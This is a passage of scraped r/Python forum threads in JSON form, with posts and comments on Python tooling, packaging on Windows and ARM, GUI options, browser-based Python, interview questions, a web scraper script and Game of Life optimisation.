                    "content": "Small Python packages meant to improve a big Python package and their name starts with the name of the big package. Pytest, flask, etc offer plugin functionality."
                },
                {
                    "author": "fesch2",
                    "score": "-5",
                    "content": ""
                }
            ]
        },
        {
            "author": "ThiefMaster",
            "score": "20",
            "content": "s/plugins/entry points/"
        }
    ]
},
{
    "post_author": "ANil1729",
    "post_id": "1dsv69t",
    "post_score": "5",
    "post_time": "Monday, July 1, 2024 at 6:02:40 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Open-source free video editing tools in Python",
    "media": [
        "https://github.com/Anil-matcha/free-video-Tools/"
    ],
    "post_content": "I have created a bunch of free video tools such as video converters, audio converters, hardcoding subtitles etc. and open-sourced them here :- https://github.com/Anil-matcha/free-video-Tools/",
    "comments": []
},
{
    "post_author": "gendulf",
    "post_id": "1dmb49s",
    "post_score": "3",
    "post_time": "Sunday, June 23, 2024 at 4:41:33 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "The winget and Windows Store distributions of Python are non-standardized",
    "media": [],
    "post_content": "Hello, reaching out to the community as I'm not sure the right place for this. There's issues with the winget and msstore distributions of Python. I'd like to file a bug against whoever maintains these distributions, but not sure where to go.\nThe Windows Store (\"msstore\") python distribution doesn't install py.exe.\nIf you run winget install --id 9NCVDN91XZQP (see winget search python to see this is the id of Python 3.12), you will not get a python3.exe (or shortcut/script) installed alongside python.exe.\nThis means that any script with the shebang #!/usr/bin/env python3 , that you invoke with py.exe will run a script placed by Microsoft that directs you to the Windows Store (assuming you don't have any other installation of python 3 from the store or python.org):\nPython was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings\nManage App Execution Aliases.\n2. The winget python distribution doesn't install a python3 binary or shortcut\nIf you run winget install --id Python.Python.3.12, you will not get a C:\\Windows\\system32\\py.exe installed\nThis doesn't seem to be new to Python 3.12, but I don't know when it was introduced. Can we push for more standardized python installations?",
    "comments": []
},
{
    "post_author": "Ani171202",
    "post_id": "f35yg0",
    "post_score": "4046",
    "post_time": "Thursday, February 13, 2020 at 9:47:33 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Python project that answers high-school problems almost instantly. Made using Tesseract, Scrapy and Flask.",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Ani171202",
            "score": "507",
            "content": "This was a group project with a bunch of friends including u/jef-_- u/Wikileaks01 u/icosahedralcello they deserve as much or even more credit than me.",
            "replies": [
                {
                    "author": "lukerox2004",
                    "score": "109",
                    "content": ""
                }
            ]
        },
        {
            "author": "contrieng",
            "score": "227",
            "content": "",
            "replies": [
                {
                    "author": "hhjjiiyy",
                    "score": "469",
                    "content": ""
                },
                {
                    "author": "Ani171202",
                    "score": "120",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "willm",
    "post_id": "1djk6u8",
    "post_score": "90",
    "post_time": "Wednesday, June 19, 2024 at 5:13:13 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Textual Serve - Serve TUIs in the browser",
    "media": [
        "https://github.com/Textualize/textual-serve"
    ],
    "post_content": "Textual Serve (https://github.com/Textualize/textual-serve) is a project which serves TUIs (built with Textual) in the browser.\nThis is self-hosted, so you don't need to rely on any external service.",
    "comments": [
        {
            "author": "eddyizm",
            "score": "4",
            "content": "So very cool."
        },
        {
            "author": "PurepointDog",
            "score": "3",
            "content": "This looks awesome! Didn't know I wanted this!"
        },
        {
            "author": "conogarcia",
            "score": "3",
            "content": "holy shit, I was looking for this last week and couldnt figure out what was ganglion.",
            "replies": [
                {
                    "author": "willm",
                    "score": "1",
                    "content": "Ganglion is the code name of the server that powers textual-web. It's not something you need to download."
                },
                {
                    "author": "Zouden",
                    "score": "1",
                    "content": "Not much, what's ganglion with you?"
                }
            ]
        },
        {
            "author": "Ok-Frosting7364",
            "score": "3",
            "content": "This is dope. Made my first TUI with Textual just a couple of months ago so keen to check this out."
        },
        {
            "author": "denehoffman",
            "score": "2",
            "content": "This is beautiful. Everyone I know always asks me how I make such beautiful APIs and interfaces and I show them Rich. Never got very far with textual, but this might convince me to come back to it"
        },
        {
            "author": "PurepointDog",
            "score": "3",
            "content": "How's its mobile performance? That's where I see the main opportunities for it!",
            "replies": [
                {
                    "author": "willm",
                    "score": "2",
                    "content": "Varies from phone to phone. Still more work to do there."
                }
            ]
        }
    ]
},
{
    "post_author": "CodewithMJ",
    "post_id": "1dqoxh5",
    "post_score": "0",
    "post_time": "Friday, June 28, 2024 at 8:15:49 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Asking Technical Interview Question in Python",
    "media": [],
    "post_content": "Hello! This is my first time posting in this community, I want to ask what is the common question or maybe a difficult one, in an technical interview about python especially in there Web Frameworks (e.g Flask, Django). I am conducting technical interview in this coming July2 & also this is my first time applying a Full Time Job as Python Developer.",
    "comments": [
        {
            "author": "ParticularCod6",
            "score": "6",
            "content": "One of the questions i like is asking about the GIL in python. If they can describe it then they will have a very good understanding of Python. Dont expect a Junior to know about it but a really good senior in Python will be able to tell me in detail",
            "replies": [
                {
                    "author": "OkLavishness5505",
                    "score": "2",
                    "content": "What's GIL? Sorry I have my weakness with acronyms."
                },
                {
                    "author": "yrubooingmeimryte",
                    "score": "1",
                    "content": "Out of curiosity, what is it you are asking them about the GIL? Just what it's for or are you asking something specific about its actual behind the scenes functionality? Because just asking what it is for seems far too simple as interview questions go and asking how it functions seems, to me, to not really test anything particularly useful about a persons actual ability to code in python."
                },
                {
                    "author": "CranberryDistinct941",
                    "score": "0",
                    "content": "Multithreading? Lol no. We don't do that here"
                }
            ]
        },
        {
            "author": "FriendlyRussian666",
            "score": "5",
            "content": "It's going to be just general question, taking Django as example: Explain the MVC architecture, and how Django implements it as a MVT. Why would you define serializers for your models when using for example Django REST? Explain RESTful services. What is a Client-Server architecture? What commands do you use to start a new app in an existing Django project? Explain CORS, CSRF and single origin development. Other questions, perhaps more relevant to Flask could be: Why is SQLAlchemy used in Flask projects? What are the benefits of using Object Relational Mappers? How do you authenticate users? How do you handle Forms in your Flask project? Etc etc.",
            "replies": [
                {
                    "author": "CodewithMJ",
                    "score": "1",
                    "content": "Noted for this"
                }
            ]
        },
        {
            "author": "fortunatefaileur",
            "score": "1",
            "content": "You should ask the recruiter what sort of things it’ll be about, I don’t think you’ll get good generic answers from Reddit with so little info."
        }
    ]
},
{
    "post_author": "jakedk",
    "post_id": "1dsebb8",
    "post_score": "60",
    "post_time": "Monday, July 1, 2024 at 2:10:40 AM GMT+3",
    "flair_text": "",
    "post_title": "Add a GUI or not?",
    "media": [],
    "post_content": "Cons: it would increase file size of the .exe, I know it's not a low but some colleagues are old school and will share it by email. It would make the code more complex and harder to maintain for myself (and potentially others in the future) Tkinter looks and feels outdated to many users (I know could use another gui framework but that would require I learn it first adding to the complexity and development time)\nI can't decide if it makes sense. I have no option to deploy it on a webserver unfortunately so I can't go that route.\nI'm personally fine with it just running it in a terminal and using a conf file or input in the terminal but some of my colleagues would not be very familiar with anything like that at all.",
    "comments": [
        {
            "author": "mr_claw",
            "score": "158",
            "content": "Run a flask server and make a web interface with something like pywebio.",
            "replies": [
                {
                    "author": "vantasmer",
                    "score": "62",
                    "content": "Second this. A well documented, simple flask service that IT runs on their infra. Bonus points if you package it in a container so it’s easy to run and don’t have to worry about dependencies. Bonus bonus points if you check it into git and add read me and additional documentation."
                }
            ]
        },
        {
            "author": "shinitakunai",
            "score": "27",
            "content": "Make it a pyside6 app and store them in your sharepoint/gitsomething Make those that would send it via mail to send the link instead. Bonus points if you add an auto-updater (check on start of program if new version is on the sharepoint/github/gitlab).",
            "replies": [
                {
                    "author": "big_data_mike",
                    "score": "8",
                    "content": "This^ And do the GUI thing. We did a hackathon a few weeks ago and I was the designated Python person on the team. I could not get them to understand the concept that when you run a script in a directory it looks for a file in that directory. I spent the whole time installing Python on their machines and installing packages. All this to say people who are not programmers don’t even understand basic basic programming concepts like a script running in a directory"
                },
                {
                    "author": "jakedk",
                    "score": "6",
                    "content": ""
                }
            ]
        },
        {
            "author": "mason_savoy71",
            "score": "17",
            "content": "Do not distribute executables. You will spend the rest of your life running down versions and being blamed for problems when someone didn't update. Don't build a GUI thick application. Just make a web app (pick your framework) so you can push the updates. Everyone will be happier."
        },
        {
            "author": "devpranoy",
            "score": "17",
            "content": "I had a good experience building a custom gui for our internal python scripts using Custom Tkinter and then pyinstaller to get a windows exe. Checkout Custom Tkinter"
        },
        {
            "author": "Tmull1985",
            "score": "7",
            "content": "I recently did just this for a department in my company. It was very important to them that any data being processed stayed on local machines for legal reasons. I personally opted to set up a simple gui with tkinter and used pyinstaller. Since it was an internal only tool I wasn’t particularly bothered that it looks a little outdated, but more concerned with ease of use. The goal was to not have to have a training session if not needed."
        },
        {
            "author": "tylerriccio8",
            "score": "6",
            "content": "I had this exact issue at my last company, to a tee. I found the best solution was distributing as a single python script that opened an in browser flask app. This would only work if the client (your coworkers I think) have python installed; and the right versioning. The exe solution was brute force but quite effective, I hosted the exe files on google drive so others could download it, which was rather effective."
        },
        {
            "author": "voords",
            "score": "16",
            "content": "Checkout Gooey (https://github.com/chriskiehl/Gooey). It will convert most python script with cli arguments to a gui app. You can use the terminal yourself, and ship the .exe with Gooey to your colleagues with near-zero effort."
        }
    ]
},
{
    "post_author": "Martynoas",
    "post_id": "1djp1gw",
    "post_score": "34",
    "post_time": "Wednesday, June 19, 2024 at 8:36:51 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Python Project Management Primer",
    "media": [
        "https://open.substack.com/pub/martynassubonis/p/python-project-management-primer?utm_source=share&utm_medium=android&r=3c7yz7"
    ],
    "post_content": "This article explores how to manage Python project environments and dependencies, as well as how to structure projects effectively.",
    "comments": [
        {
            "author": "abakad",
            "score": "2",
            "content": "Great write up. For me, it sort of ties together all the little bits of info I learned through the years."
        },
        {
            "author": "ComprehensiveSalad71",
            "score": "2",
            "content": "Thanks for sharing it!"
        },
        {
            "author": "cyan2001y",
            "score": "1",
            "content": "nice article"
        },
        {
            "author": "wineblood",
            "score": "-3",
            "content": "Is this suggesting working without venvs?",
            "replies": [
                {
                    "author": "ForeheadMeetScope",
                    "score": "2",
                    "content": "Did you read the article? It goes into specific detail in the use of venvs..."
                }
            ]
        }
    ]
},
{
    "post_author": "GrizzlyBaird2112",
    "post_id": "hu4umj",
    "post_score": "3940",
    "post_time": "Sunday, July 19, 2020 at 9:01:40 PM GMT+3",
    "flair_text": "Meta",
    "post_title": "Thought this looked familiar...",
    "media": [
        "https://www.reddit.com/r/oddlysatisfying/",
        "https://preview.redd.it/mfy0xday2ub51.jpg?width=640&crop=smart&auto=webp&s=444cd18090ff2531edda9bb8b7b36d3123fea22e",
        "https://i.redd.it/mfy0xday2ub51.jpg",
        "https://www.reddit.com/r/oddlysatisfying/comments/hu2fai/this_smoothie_after_being_blended/"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Actuarial",
            "score": "147",
            "content": ""
        },
        {
            "author": "__FilthyFingers__",
            "score": "96",
            "content": ""
        },
        {
            "author": "nekogareth",
            "score": "38",
            "content": "ah yes the slack logo"
        },
        {
            "author": "[deleted]",
            "score": "13",
            "content": "Great idea for basic form of Python 4 logo"
        },
        {
            "author": "babalinobaba",
            "score": "5",
            "content": "Oh you beat me to it, I wanted to redo the colors so it matches."
        },
        {
            "author": "frankendilt",
            "score": "5",
            "content": "Here’s a twist, made a python in blender."
        },
        {
            "author": "SmellyPiratePart",
            "score": "2",
            "content": "raw hot dogs bent over 1 another"
        },
        {
            "author": "james14street",
            "score": "2",
            "content": "Looks like four tongues to me"
        },
        {
            "author": "zad_sixstrings",
            "score": "2",
            "content": "from blender import pythonlogo"
        },
        {
            "author": "ThatOneRedditUser-_-",
            "score": "2",
            "content": "I thought it was 4 chicken breasts 🤨"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dq60v8",
    "post_score": "1",
    "post_time": "Friday, June 28, 2024 at 3:00:43 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Ok-Frosting7364",
            "score": "1",
            "content": "Anyone else prefer argsparse to click?"
        },
        {
            "author": "pyeri",
            "score": "1",
            "content": "I have recently published an app on Google Play Store called Python MCQ. It's a multi-choice Q/A format app which evaluates the user's Python programming skills. Where can I find beta testers for this app?"
        }
    ]
},
{
    "post_author": "pdfisk",
    "post_id": "1dl8stp",
    "post_score": "50",
    "post_time": "Friday, June 21, 2024 at 7:56:44 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Running Python in Web Browsers",
    "media": [
        "https://www.antlr.org/",
        "https://www.brython.info/",
        "https://github.com/beeware/batavia",
        "https://www.reddit.com/r/VistaPython/",
        "https://pyodide.org/en/stable/",
        "https://skulpt.org/",
        "https://pyscript.net/"
    ],
    "post_content": "Python is one of the world's most popular programming languages and the web is the most ubiquitous application platform. There are several projects which aim to enable Python to run in web browsers.\nBrython is an implementation of Python 3 written in JavaScript.\nSkulpt is an implementation of Python 2/3 written in JavaScript.\nPyScript is an implementation of Python 3 written in WebAssembly.\nTranscrypt is a Python to JavaScript compiler - unfortunately, the project seems to have been abandoned.\nBatavia is a Python virtual machine written in JavaScript - unfortunately, the project seems to have been abandoned.\nFinally, I have created VistaPython which is also intended to run Python 3 in web browsers but by using a bytecode interpreter written in JavaScript.\nEach design has strengths and weaknesses:\nBoth Brython and Skulpt use hand-written Python parsers which are difficult to maintain. VistaPython uses a parser generator, Antlr, to automatically generate the JavaScript code for the parser. The parser can be updated to match the latest Python version by simply running a script.\nAlso, both Brython and Skulpt generate JavaScript code which is then evaluated. In VistaPython, the compiler produces a \"code object\" which is then executed using the bytecode interpreter. The first approach will result in faster code whereas the second approach can be more flexible for code stepping, etc.\nPyScript is based on Pyodide which is a port of CPython to WebAssembly.\nPyScript can be upgraded the latest Python release by recompiling the latest CPython sources. Its main disadvantage is that it is very heavy to load and seems to run poorly on mobile devices.\nIn VistaPython, the load profiles are:\nvm.js (Python virtual machine) 761kb\nPython parser 368 kb\nMobile client GUI 2.4 Mb\nDesktop client GUI 2.9 Mb\nCompiled applications can be run using only the Python virtual machine (761kb).\nThe design goal of VistaPython is to be able to load compiled applications from a database and run them quickly on any web device.",
    "comments": [
        {
            "author": "BurningSquid",
            "score": "12",
            "content": "How is pyscript these days? Seemed promising when I first heard about it but was pretty slow. Always like the idea of eliminating barriers to run python applications, thanks for this rundown",
            "replies": [
                {
                    "author": "riklaunim",
                    "score": "7",
                    "content": "They move to MicroPython as the default backend, that rather helped with issues."
                }
            ]
        },
        {
            "author": "ExdigguserPies",
            "score": "5",
            "content": "Just wanted to point out your name is verrrry similar to PyVista, a well known 3D visualisation project."
        },
        {
            "author": "fortunatefaileur",
            "score": "26",
            "content": "Are you sure you’re obeying the Python license? And trademark rules?",
            "replies": [
                {
                    "author": "Calimariae",
                    "score": "2",
                    "content": "The word \"Python\" For commercial products, contact the PSF for permission. Use of the word \"Python\" in company names -- Allowed only by prior written permission from the PSF. Use of the word \"Python\" when redistributing the Python programming language as part of a freely distributed application -- Allowed. https://www.python.org/psf/trademarks/ Huh, TIL.",
                    "replies": [
                        {
                            "author": "pdfisk",
                            "score": "2",
                            "content": "Thanks for pointing this out. I will check to make sure that I am not contravening any trademarks. There will always be a freely distributed version of Vista Python, so I don't foresee any problems arising."
                        }
                    ]
                }
            ]
        },
        {
            "author": "riklaunim",
            "score": "3",
            "content": "The thing is for frontend you also need frameworks/libraries. JavaScript has a lot of tools, SPA frameworks and more. Python browsers variants still are \"experimental\" on their own and don't have good ecosystem around them. And then a frontend/fullstack developer would have to use it. Backend dev without getting to know frontend won't be able to use it efficiently or at all."
        },
        {
            "author": "Cautious-Ad6043",
            "score": "3",
            "content": "Will you be releasing the source code?"
        },
        {
            "author": "Powerspawn",
            "score": "3",
            "content": "There is also pygbag that supports running pygame in the browser. I have been using it for my recreation of the board game Santorini."
        },
        {
            "author": "JennaSys",
            "score": "3",
            "content": "For the record, Transcrypt isn't abandoned, it just hasn't got much love as of late."
        },
        {
            "author": "DNSGeek",
            "score": "4",
            "content": "Check out anvil.",
            "replies": [
                {
                    "author": "kalebludlow",
                    "score": "2",
                    "content": "+1 for anvil, the team manages skulpt heavily as they rely on it for the python-to-JS"
                }
            ]
        }
    ]
},
{
    "post_author": "SAV_NC",
    "post_id": "1dlfge9",
    "post_score": "14",
    "post_time": "Saturday, June 22, 2024 at 12:40:46 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "A simple website scraper script",
    "media": [
        "https://github.com/slyfox1186/script-repo/blob/main/Python3/Networking/web-scraper.py"
    ],
    "post_content": "Web Scraper Script\nWhat My Project Does\nThis project scrapes websites to extract and display titles and links of articles. It processes multiple websites in parallel, fetching and parsing content to provide a consolidated list of articles with their full URLs.\nTarget Audience\nHome users, researchers, and web enthusiasts who need to gather information from multiple websites quickly and efficiently.\nFeatures\nParallel Processing: Uses ThreadPoolExecutor to fetch multiple websites concurrently, speeding up the scraping process.\nError Handling and Logging: Provides detailed logging for debugging and retry mechanisms for robustness.\nFull URL Extraction: Ensures that all extracted links are complete URLs, enhancing usability.\nCustomizable Headers: Allows customization of HTTP headers to mimic different browsers.\nScript Overview\nThe script consists of several key components:\nFetching URLs\nThe script fetches content from the given URLs using the requests library. It includes retry logic with exponential backoff to handle transient errors.\nParsing Content\nThe script uses BeautifulSoup to parse the fetched HTML content and extract article titles and links. It ensures that the links are converted to full URLs using urljoin.\nConcurrent Execution\nThe script employs ThreadPoolExecutor to fetch and parse content from multiple websites in parallel, improving efficiency.\nAccess the Script\nYou can access the script on GitHub here: Web Scraper Script on GitHub\nHow to Use\nInstall Dependencies: Ensure you have requests and beautifulsoup4 installed:\npip install requests beautifulsoup4\nRun the Script: Provide the URLs of the websites you want to scrape as arguments:\npython3 web-scraper.py https://yahoo.com https://sports.yahoo.com\nConclusion\nThis web scraper script is designed to be robust, efficient, and easy to use. It handles multiple websites in parallel, provides detailed logging, and ensures full URL extraction for all links. Ideal for users who need to quickly gather and consolidate information from various sources.",
    "comments": [
        {
            "author": "rumnscurvy",
            "score": "6",
            "content": "What is the advantage of using this script compared to existing, well established libraries like Scrapy?",
            "replies": [
                {
                    "author": "Stock-Parking-281",
                    "score": "2",
                    "content": "Training purpose I guess ?"
                }
            ]
        }
    ]
},
{
    "post_author": "Fun-Asparagus-837",
    "post_id": "1djtma4",
    "post_score": "19",
    "post_time": "Wednesday, June 19, 2024 at 11:47:33 PM GMT+3",
    "flair_text": "",
    "post_title": "Python on ARM laptops",
    "media": [],
    "post_content": "I'm thinking about buying an ARM windows laptop with the new Qualcomm chips. They will replace the x86 so I was wondering : Will There be a massive risk of non-compatibility of Python packages ? I guess they are made for x86 but I don't know if it's possible to work with them with an ARM based CPU.\nEdit : Had a great deal on the ideapad pro 5 gen 9 so I went for it. Glad to have these incredible specs and decided to rely on x86 chip for the moment, because I wanted to avoid all the early-adoption problems",
    "comments": [
        {
            "author": "Nil0ch",
            "score": "35",
            "content": "Probably you will need to use the Windows Subsystem For Linux (WSL) as your development environment in order to install compiled packages of arm distributions of Linux. There are probably lots of libraries that aren’t yet providing prebuilt wheels for native Arm Windows.",
            "replies": [
                {
                    "author": "Fun-Asparagus-837",
                    "score": "2",
                    "content": "Thanks for your answer !! YEah, I will check how the situation evolves but it would be very dumb to buy a laptop and not be able to work because of these issues. I will probably go for an x86",
                    "replies": [
                        {
                            "author": "Nil0ch",
                            "score": "2",
                            "content": "Just to clarify, windows computers now have a way to run a Linux virtual machine natively without additional emulation software. It lets you run programs in a Linux environment instead of windows. This is especially helpful when the underlying CPU is ARM based because Python libraries with compiled extensions are way more likely to make Linux ARM versions and release them on pypi than native windows binaries. For example, Numpy just released a 2.0 version, but by the looks of it you can only get x86 versions for native Windows. But if you use the WSL2 on an ARM windows machine you will be installing the ARM Linux versions without any issues. If you are coming from Mac, the Linux environment will also feel more familiar. Linux ARM versions are becoming more common both because people on MacOs are running Linux via Docker, and because there now many cloud computing environments that offer Linux runtimes on ARM cpus. That incentivizes library maintainers to support them sooner than windows ARM environments.",
                            "replies": [
                                {
                                    "author": "trowawayatwork",
                                    "score": "1",
                                    "content": "also if wheels aren't available you can just try compiling yourself. however it will take longer and can fail for things like pandas which are notoriously quirky to compile"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "latkde",
            "score": "12",
            "content": "Most Python packages are distributed as \"wheels\". They may or may not be platform-specific. Most Python packages are pure-Python and have a single wheel that works everywhere. If they are platform specific because of some native extension for CPython, it depends on the package authors which Python versions × operating systems × CPU architectures are supported. The particular combination win+arm64 is effectively nonexistent, though. That may change in the future. But this doesn't mean that you can't install those packages – it means pip may have to download the source code and compile the packages on your system. That is a lot slower, and requires that you have a suitable compiler toolchain installed. Because this is quite challenging on Windows, some people prefer tools like Conda that may offer pre-compiled packages even if the original package authors didn't create a wheel."
        },
        {
            "author": "hardtobeuniqueuser",
            "score": "2",
            "content": "I have been using a Thinkpad x13 for 6 months or so and have had no issues in this regard. As another comment mentioned, WSL is there: Linux tpadx13s 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:16:34 UTC 2024 aarch64 aarch64 aarch64 GNU/Linux Here's some info about emulation:  https://learn.microsoft.com/en-us/windows/arm/apps-on-arm-x86-emulation There is a Windows ARM Python release. I use Python and powershell primarily through vscode and haven't had to do anything differently. I also play with micropython and use thonny most of the time for it, using the x64 version for that and I've had no issues. Honestly even forgot until writing this comment. Same for the Arduino IDE. Really the only issue I have had at all is the emulation doesn't get you drivers, so if you have a device you want to connect and there isn't a native driver, your probably not going to find one. For the why on my side, I wanted the battery life and the slim size, but even more than those I wanted something fanless. It has worked out great for me. Most of the time have no idea when I last charged it. I picked mine up as a refurb from eBay, but it was really an open box. I got it only about 6 weeks after it was originally purchased. 16GB with an unlocked 5G modem in it and 3 yr warranty was 525 shipped."
        },
        {
            "author": "I_FAP_TO_TURKEYS",
            "score": "2",
            "content": "You can write any program in any language for any operating system. That said, you sure you want to use windows? If your goal is python development, and performance is of any importancs (even if it's last on priority list, it is important enough to make the priority list) then removing the spyware/bloatware of windows and going with <insert any distro> Linux will be your best option. I saw a 30% improvement in performance just by changing operating system. And the only compatibility issues I've had have been using the wrong version of Wine."
        },
        {
            "author": "Mr_Ixolate",
            "score": "1",
            "content": "Main issue with python libraries I had were with numpy and pandas. As others have mentioned wsl works fine, discounting the occasional freeze."
        },
        {
            "author": "riklaunim",
            "score": "1",
            "content": "Note that there are some problems with dev tools on those chips, yesterday one of the reviewers did a live stream and Windows was blocking some of the apps from even installing. It's still a very early platform (and it would be good to have Linux and not just Windows as Linux on ARM is way more mature not to mention better for development)."
        },
        {
            "author": "ChimpanzeChapado",
            "score": "1",
            "content": "I had some issues with a package when running python on my M1 Max, but the package was built by Intel so that was expected. Except for this one, everything I used on ML/Webdev worked fine."
        },
        {
            "author": "pmatti",
            "score": "1",
            "content": "If you want to do any data processing using packages like numpy, pytorch, pandas you could use the wheels from https://github.com/cgohlke/win_arm64-wheels/ But as others have said, this is all early adopter stage stuff"
        },
        {
            "author": "skorphil",
            "score": "1",
            "content": "I would not risk buying windows arm now. Better wait at least a year and see, how apps will be adopted. For now x64 win and arm64 mac os are far more preferable and time-tested"
        }
    ]
},
{
    "post_author": "-sideshow-",
    "post_id": "jui7zw",
    "post_score": "3936",
    "post_time": "Sunday, November 15, 2020 at 10:36:29 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "PrettyErrors, a module to format exception reports",
    "media": [
        "https://external-preview.redd.it/a9Bn9wOSSC4SSlEuPpTwGazz_f97n-i8-gHqVqkIT9E.png?width=640&crop=smart&auto=webp&s=cc8b54ac284bb9abbb5729ce4bd31d3f51752180",
        "https://raw.githubusercontent.com/onelivesleft/PrettyErrors/master/example.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "FormalWolf5",
            "score": "642",
            "content": ""
        },
        {
            "author": "-sideshow-",
            "score": "347",
            "content": "",
            "replies": [
                {
                    "author": "BeastCoder",
                    "score": "55",
                    "content": ""
                },
                {
                    "author": "AnswerAwake",
                    "score": "29",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dlig0j",
    "post_score": "6",
    "post_time": "Saturday, June 22, 2024 at 3:00:12 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "fischerrobinson",
            "score": "1",
            "content": "Not sure if this belongs here, but looking for ways to gain more experience and would enjoy collaborating on a larger Python project. Please feel free to comment or PM me if you are looking for some free help👍🏻"
        },
        {
            "author": "Movladi_M",
            "score": "1",
            "content": "Does anyone know what happened to u/LearnPythonWithRune??? Rune has a great youtube channel with a lot of good resources. Now everything is gone: his youtube channel, his GitHub, his Udemy courses. Literally everythin is gone. Does anyoe knows what is going on?"
        }
    ]
},
{
    "post_author": "Significant_Water_28",
    "post_id": "1djta0v",
    "post_score": "4",
    "post_time": "Wednesday, June 19, 2024 at 11:33:17 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Conway's game of life. can you find an optimization?",
    "media": [],
    "post_content": "little challenge for you, how fast can this be pushed in python?\nThis function takes a numpy.ndarray / 2d numpy array, and returns the updated array. iv updated this function several times, this i the fastiest so far.\nnumba jit dosn't like the double roll, and its faster than for loops in jit.\ndef conways_game_of_life(board:numpy.ndarray):\n  n_neighbour = sum(numpy.roll(numpy.roll(board, i, 0), j, 1) for i in (-1, 0, 1) for j in (-1, 0, 1) if (i != 0 or j != 0))\n  board[(n_neighbour<2) | (n_neighbour>3)] = 0\n  board[(n_neighbour==3)] = 1\n  return board",
    "comments": [
        {
            "author": "abeld",
            "score": "14",
            "content": "Can't keep myself from plugging my favourite optimization trick: you can achieve exponential speedup using the Hashlife algorithm, see https://en.wikipedia.org/wiki/Hashlife"
        },
        {
            "author": "naclmolecule",
            "score": "5",
            "content": "import numpy as np import scipy.ndimage as nd KERNEL = np.array([[1, 1, 1], [1, 0, 1], [1, 1, 1]], dtype=np.uint8) def next_state(universe): neighbor_count = nd.convolve(universe, KERNEL, mode=\"constant\") still_alive = universe & np.isin(neighbor_count, (2, 3)) births = ~universe & (neighbor_count == 3) return still_alive | births if you allow yourself another library that has 2d convolutions, you may be able to get a speed up",
            "replies": [
                {
                    "author": "Significant_Water_28",
                    "score": "3",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "-sideshow-",
    "post_id": "jui7zw",
    "post_score": "3936",
    "post_time": "Sunday, November 15, 2020 at 10:36:29 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "PrettyErrors, a module to format exception reports",
    "media": [
        "https://external-preview.redd.it/a9Bn9wOSSC4SSlEuPpTwGazz_f97n-i8-gHqVqkIT9E.png?width=640&crop=smart&auto=webp&s=cc8b54ac284bb9abbb5729ce4bd31d3f51752180",
        "https://raw.githubusercontent.com/onelivesleft/PrettyErrors/master/example.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "FormalWolf5",
            "score": "642",
            "content": ""
        },
        {
            "author": "-sideshow-",
            "score": "347",
            "content": "",
            "replies": [
                {
                    "author": "BeastCoder",
                    "score": "55",
                    "content": ""
                },
                {
                    "author": "AnswerAwake",
                    "score": "29",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "Chilangosta",
    "post_id": "7jti46",
    "post_score": "4620",
    "post_time": "Thursday, December 14, 2017 at 9:24:25 PM GMT+3",
    "flair_text": "",
    "post_title": "MS is considering official Python integration with Excel, and is asking for input",
    "media": [
        "https://external-preview.redd.it/LejP60PwIDcM7RSYMUVVmsw5WsyIRrd8Hrmu8FrqgG4.jpg?width=640&crop=smart&auto=webp&s=3562aee92a5582437618364488609254b354aa11",
        "https://i.imgur.com/l2f9Zvb.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "1roOt",
            "score": "743",
            "content": "I think it is a really good idea. Who uses VBA anyways? Or better: who likes to use VBA? If i have a specific problem with VBA it is a hell of a mess to find the right resources to fix my problem. With python, I just do a quick search and can find nearly limitless helpful resources. So go python!",
            "replies": [
                {
                    "author": "Chilangosta",
                    "score": "200",
                    "content": ""
                }
            ]
        },
        {
            "author": "Chilangosta",
            "score": "204",
            "content": ""
        },
        {
            "author": "decimated_napkin",
            "score": "413",
            "content": "Adding python support to Excel is like adding a lion to your pack of hunting dogs and then being upset when the lion just goes off and hunts by itself because your dogs are inconsequential to its success.",
            "replies": [
                {
                    "author": "Hotel_Arrakis",
                    "score": "153",
                    "content": "I'm not sure I agree, but an upvote for your simile."
                }
            ]
        }
    ]
},
{
    "post_author": "SAV_NC",
    "post_id": "1dk0ru7",
    "post_score": "1",
    "post_time": "Thursday, June 20, 2024 at 5:21:20 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Video Quality Ranker",
    "media": [
        "https://github.com/slyfox1186/script-repo/blob/115b8d2f038c22ec5b5ea9b85ae87287106e90b8/Bash/Installer%20Scripts/FFmpeg/run-scripts/video-quality-ranker.py"
    ],
